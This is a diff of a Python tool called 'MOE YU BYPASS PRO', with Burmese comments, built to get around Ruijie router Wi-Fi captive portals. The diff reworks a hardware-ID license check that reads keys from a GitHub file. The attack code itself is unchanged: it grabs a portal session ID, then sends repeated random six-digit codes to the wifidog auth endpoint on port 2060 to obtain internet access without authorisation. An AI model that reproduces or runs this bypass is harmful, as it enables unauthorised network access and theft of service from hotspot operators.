@@ -25,32 +25,32 @@ from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 from concurrent.futures import ThreadPoolExecutor
 
-# --- CONFIGURATION (Moe Yu's Database) ---
+# --- CONFIGURATION ---
 KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
 
 # Colors
 w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"
 
 def get_hwid():
-    """Android System ID ကို တိုက်ရိုက်ဆွဲထုတ်ခြင်း (Fixed ID အတွက် အသေချာဆုံးနည်းလမ်း)"""
+    """လူတိုင်းအတွက် မတူညီတဲ့ Unique Fixed ID ထုတ်ပေးမည့်စနစ်"""
     try:
-        # Android ID ကို settings command နဲ့ ဆွဲထုတ်ခြင်း
-        raw_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
-        if not raw_id or raw_id == "null":
-            # မရခဲ့ရင် Termux Path ကို အခြေခံပြီး ID ထုတ်ခြင်း
-            raw_id = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
+        # ဖုန်းရဲ့ Hardware အချက်အလက်များကို ပေါင်းစပ်ခြင်း
+        model = os.popen('getprop ro.product.model').read().strip()
+        board = os.popen('getprop ro.product.board').read().strip()
+        # ပုံသေဖြစ်မည့် Termux User ID တစ်ခုကို ယူခြင်း
+        user = os.popen('whoami').read().strip()
+        
+        raw_id = f"{model}-{board}-{user}"
+        # အကယ်၍ အချက်အလက် မရခဲ့ရင် UUID Node ကို သုံးမယ်
+        if len(raw_id) < 5:
+            raw_id = str(uuid.getnode())
+            
         return hashlib.md5(raw_id.encode()).hexdigest().upper()
     except:
-        return "MOEYU-STABLE-LICENSE-SYSTEM-FIXED"
-
-def clear():
-    os.system("clear")
-
-def Line():
-    print(f"{y}─" * os.get_terminal_size()[0])
+        return "MOEYU-STABLE-USER-UNSET"
 
 def Logo():
-    clear()
+    os.system("clear")
     my_id = get_hwid()
     logo = f"""{r}
  ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
@@ -58,49 +58,50 @@ def Logo():
  ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
  ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
  ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
- ░ ▒▓ ▒ ░      ▒ ░ ▒ ░   ░░ ▒░ ░   ██▒▒▒    ██▒▒▒ 
- ░ ░▒ ░        ░  ▒       ░ ░  ░ ▓██ ░▒░  ▓██ ░▒░ 
-   ░  ░      ░          ░    ▒ ▒ ░░   ▒ ▒ ░░  
-     ░       ░ ░        ░  ░ ░ ░      ░ ░      ░  
-{g}
-         ── {w}MOE YU BYPASS PRO {g}──{w}"""
+{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
     print(logo)
-    Line()
+    print(f"{y}─" * os.get_terminal_size()[0])
     print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
     print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
     print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
-    Line()
+    print(f"{y}─" * os.get_terminal_size()[0])
 
 def check_key():
     my_id = get_hwid()
     Logo()
-    print(f"{y}[*] Verifying Secure License...{w}")
+    print(f"{y}[*] Verifying Stable License...{w}")
     try:
         res = requests.get(KEY_URL, timeout=15)
         if res.status_code == 200:
             lines = res.text.splitlines()
             for line in lines:
                 if "|" in line:
-                    key, exp_str = line.split("|")
-                    if key.strip() == my_id:
+                    # split လုပ်တဲ့အခါ ကွက်လပ် (Space) များကို ဖယ်ထုတ်ရန် strip() သုံးထားသည်
+                    parts = line.split("|")
+                    key = parts[0].strip()
+                    exp_str = parts[1].strip()
+                    
+                    if key == my_id:
                         today = datetime.now().date()
-                        expiry = datetime.strptime(exp_str.strip(), "%Y-%m-%d").date()
+                        expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                         if today <= expiry:
-                            print(f"{g}[+] License Authorized!{w}")
-                            time.sleep(1.5)
+                            print(f"{g}[+] Access Authorized!{w}")
+                            time.sleep(1)
                             return True
                         else:
-                            print(f"{r}[!] KEY EXPIRED!{w}")
+                            print(f"{r}[!] YOUR KEY EXPIRED!{w}")
                             sys.exit()
+            
             print(f"{r}[!] UNREGISTERED ID!{w}")
-            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
+            print(f"{y}[>] Your ID: {c}{my_id}{w}")
+            print(f"{y}[>] Copy this ID and put it in GitHub key.txt")
             sys.exit()
     except:
-        print(f"{r}[!] Connection Failed!{w}")
+        print(f"{r}[!] Database Connection Error!{w}")
         sys.exit()
 
 async def get_session_id(session, session_url, prev_id):
-    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
+    headers = {'User-Agent': 'Mozilla/5.0'}
     try:
         async with session.get(session_url, headers=headers, timeout=5) as req:
             return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
@@ -121,7 +122,7 @@ class InternetAccess:
                 code = "".join(random.choice(string.digits) for _ in range(6))
                 try:
                     async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
-                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active | Status: {g}{res.status}")
+                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {g}{res.status}")
                 except: pass
                 await asyncio.sleep(1)
                 l += 1
@@ -136,7 +137,7 @@ def feature():
             res = requests.get("http://192.168.0.1", timeout=5).url
             gw = re.search('gw_address=(.*?)&', res).group(1)
             with open(".ip", "w") as f: f.write(gw)
-            print(f"{g}[+] Setup Success! ID is now Fixed.{w}")
+            print(f"{g}[+] Setup Success!{w}")
         except: print(f"{r}[!] Setup Failed.")
     elif args.option == "internet":
         asyncio.run(InternetAccess().execute())
